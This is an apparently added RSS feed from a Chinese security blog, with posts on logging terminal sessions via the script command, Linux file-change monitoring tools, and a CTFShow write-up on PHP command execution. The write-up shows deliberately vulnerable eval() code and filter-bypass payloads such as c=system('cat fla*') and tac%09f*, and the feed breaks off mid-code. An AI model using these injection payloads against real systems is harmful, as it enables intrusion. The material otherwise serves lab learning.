+        <pubDate>Tue, 14 Sep 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E7%9B%91%E6%8E%A7/</guid>
+        <description>&lt;p&gt;​	当有人使用你的电脑时，或者有人远程登录到你的机器时，你肯定想尽量详细的记录下别人做的一切。众所周知有个      history命令可以记录下在终端上敲下的命令，但是却无法复现出这些命令输出到终端的信息，这时就可以使用 script 命令，该命令是linux的系统命令，非常简单好用。&lt;/p&gt;
+&lt;h2 id=&#34;如何使用&#34;&gt;如何使用&lt;/h2&gt;
+&lt;p&gt;​	我们可以直接在命令行中输入 script 命令来启动。先来看一下帮助文档。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Usage:
+ script &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;options&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;file&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+
+Make a typescript of a terminal session.
+
+Options:
+ -a, --append                  append the output
+ -c, --command &amp;lt;command&amp;gt;       run &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; rather than interactive shell
+ -e, --return                  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; code of the child process
+ -f, --flush                   run flush after each write
+     --force                   use output file even when it is a link
+ -o, --output-limit &amp;lt;size&amp;gt;     terminate &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; output files exceed size
+ -q, --quiet                   be quiet
+ -t&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;lt;file&amp;gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, --timing&lt;span class=&#34;o&#34;&gt;[=&lt;/span&gt;&amp;lt;file&amp;gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; output timing data to stderr or to FILE
+ -h, --help                    display this &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt;
+ -V, --version                 display version
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;​	script 命令可以指定文件名来记录打印结果，之后目标文件就可以记录下输出在终端上的文本信息。&lt;/p&gt;
+&lt;p&gt;​	使用 Crtl + D 退出，或者输入 exit 。&lt;/p&gt;
+&lt;p&gt;​	和该命令配套的还有一个 scriptreplay ，可以用来重放保存后的文件，但是该命令并不是系统默认命令而是需要安装， 如何安装呢？其实这个脚本是一个pl脚本，在 util-linux 这个包里可以找到它。在安装前一定要安装gcc，如果不安装在编译的时候肯定报错，安装后就可以使用了。（参考&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/wulaoer/p/5168150.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;文章&lt;/a&gt;）&lt;/p&gt;
+&lt;h2 id=&#34;自动化&#34;&gt;自动化&lt;/h2&gt;
+&lt;p&gt;​	可以使用bash脚本让 script 命令在有人登陆后自动运行，我们可以把它添加进shell环境配置文件中。如果你正在使用bash shell，把这一行加进你的bash环境配置文件中。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;    $ vi ~/.profile
+     
+    &lt;span class=&#34;c1&#34;&gt;# run the script command to record everything&lt;/span&gt;
+    &lt;span class=&#34;c1&#34;&gt;# use -q for quite and -a option to append the script&lt;/span&gt;
+    &lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
+    /usr/bin/script -qa /usr/local/script/log_record_script
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后保存。下次他登录进你的系统时，script命令就会自动运行，并把日志记录进 /usr/local/script/logrecordscript 。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>linux文件安全监测</title>
+        <link>https://lunaasuka.github.io/p/linux%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8%E7%9B%91%E6%B5%8B/</link>
+        <pubDate>Mon, 13 Sep 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/linux%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8%E7%9B%91%E6%B5%8B/</guid>
+        <description>&lt;h3 id=&#34;知识点记录&#34;&gt;知识点记录&lt;/h3&gt;
+&lt;p&gt;首先介绍一个工具，是一款开源的十分好用的资源监控工具——glances。&lt;img src=&#34;https://lunaasuka.github.io/p/linux%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8%E7%9B%91%E6%B5%8B/1631531785923.png&#34;
+	width=&#34;1440&#34;
+	height=&#34;890&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/linux%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8%E7%9B%91%E6%B5%8B/1631531785923_hu233d009daeaf463617adc7d876a0d9df_1075469_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/linux%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8%E7%9B%91%E6%B5%8B/1631531785923_hu233d009daeaf463617adc7d876a0d9df_1075469_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1631531785923&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;161&#34;
+		data-flex-basis=&#34;388px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;glances是一个基于python语言开发，可以为linux或者UNIX性能提供监视和分析性能数据的功能。glances在用户的终端上显示重要的系统信息，并动态的进行更新，让管理员实时掌握系统资源的使用情况，而动态监控并不会消耗大量的系统资源，比如CPU资源，通常消耗小于2%，glances默认每两秒更新一次数据。同时glances还可以将相同的数据捕获到一个文件，便于以后对报告进行分析和图形绘制，支持的文件格式有.csv电子表格格式和和html格式。&lt;/p&gt;
+&lt;p&gt;glances可以分析系统的：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CPU使用率&lt;/li&gt;
+&lt;li&gt;内存使用率&lt;/li&gt;
+&lt;li&gt;内核统计信息和运行队列信息&lt;/li&gt;
+&lt;li&gt;磁盘I/O速度、传输和读/写比率&lt;/li&gt;
+&lt;li&gt;磁盘适配器&lt;/li&gt;
+&lt;li&gt;网络I/O速度、传输和读/写比率&lt;/li&gt;
+&lt;li&gt;页面监控&lt;/li&gt;
+&lt;li&gt;进程监控-消耗资源最多的进程&lt;/li&gt;
+&lt;li&gt;计算机信息和系统资源&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;安装也比较简单，他们的&lt;a class=&#34;link&#34; href=&#34;https://github.com/nicolargo/glances&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;github界面&lt;/a&gt;提供了多种安装方式，我这边就简单的pip3 install glances安装了。&lt;/p&gt;
+&lt;p&gt;关于该工具的使用方法国内也有不少人写过文章，详细内容请自己去搜寻。&lt;/p&gt;
+&lt;h2 id=&#34;监控linux下文件变化&#34;&gt;监控linux下文件变化&lt;/h2&gt;
+&lt;p&gt;**1）**使用find -ctime (参数) 命令&lt;/p&gt;
+&lt;p&gt;该命令可以查看参数时间内发生过变动的文件。&lt;/p&gt;
+&lt;p&gt;例如find -ctime -5可以找出5天内变化过的文件，之后可以结合exec命令进行其他操作。有关find的一些用法请看我的另一篇文章&lt;a class=&#34;link&#34; href=&#34;https://lunaasuka.github.io/2021/09/13/find%e5%91%bd%e4%bb%a4%e7%89%b9%e6%ae%8a%e7%94%a8%e6%b3%95/&#34; &gt;“find命令特殊用法”&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;ps：这里既可以使用ctime也可以使用mtime，两者稍有差异，但是网上对此的解析比较少（但是各类教程使用mtime的倒是很多&amp;hellip;），所以大家斟酌着使用，习惯用哪个就用哪个。&lt;/p&gt;
+&lt;p&gt;**2）**使用Iynis工具&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://cisofy.com/lynis/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;这里&lt;/a&gt;是lynis的官方网站。&lt;/p&gt;
+&lt;p&gt;Lynis 是一款运行在 Unix/Linux 平台上的基于主机的、开源的安全审计软件。Lynis是针对Unix/Linux的安全检查工具，可以发现潜在的安全威胁。这个工具覆盖可疑文件监测、漏洞、恶意程序扫描、配置错误等。 笔者暂时还没有研究该工具，以后可能会单独写一篇文章来介绍该工具。&lt;/p&gt;
+&lt;p&gt;**3）**通过脚本来进行文件md5监控&lt;/p&gt;
+&lt;p&gt;我们可以简单的计算一个文件的md5值然后记录下来，之后如果进行比对的时候这个值发生变化了则该文件已经被更改过了。网上开源的脚本不少，我在这里就不做介绍了，有需求的同学请自寻。&lt;/p&gt;
+&lt;p&gt;2021-9-29日注：发现了一个工具可以用来监测文件特征值，比使用脚本方便的多，叫 aide ,我这边没有安装也尚未进行测试，但是网上有关的教程和实验很多，大家可以去查查看。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CTFShow web入门命令执行wp</title>
+        <link>https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cwp/</link>
+        <pubDate>Wed, 14 Apr 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cwp/</guid>
+        <description>&lt;h3 id=&#34;开始入门&#34;&gt;开始入门&lt;/h3&gt;
+&lt;h2 id=&#34;web29&#34;&gt;web29&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/flag/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+    
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这道题姿势很多，为了循序渐进我不会放出特别多的payload，其他姿势请大家根据后续学习的知识自行探索。&lt;/p&gt;
+&lt;p&gt;payload：c=system(&amp;ldquo;cat fla*&amp;quot;);&lt;/p&gt;
+&lt;p&gt;使用通配符 * ，计算机会自行寻找合适的文件打开。&lt;/p&gt;
+&lt;h2 id=&#34;web30&#34;&gt;web30&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/flag|system|php/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+    
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;跟上一道题比起来多过滤了system和php两个关键字。只要不用这两个就好了。&lt;/p&gt;
+&lt;p&gt;payload：c=echo exec(&amp;lsquo;cat fla*&#39;);&lt;/p&gt;
+&lt;p&gt;众所周知system()函数可以用来执行系统命令，除了它以外仍然有许多命令执行函数。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;passthru&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;shell_exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;popen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;proc_open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;pcntl_exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;反引号&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;即&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;` `&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;同shell_exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;web31&#34;&gt;web31&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/flag|system|php|cat|sort|shell|\.| |\&amp;#39;/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+    
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里过滤了cat，还有其他的东西。自然不用cat就好。&lt;/p&gt;
+&lt;p&gt;payload: c=echo(tac%09f*);&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
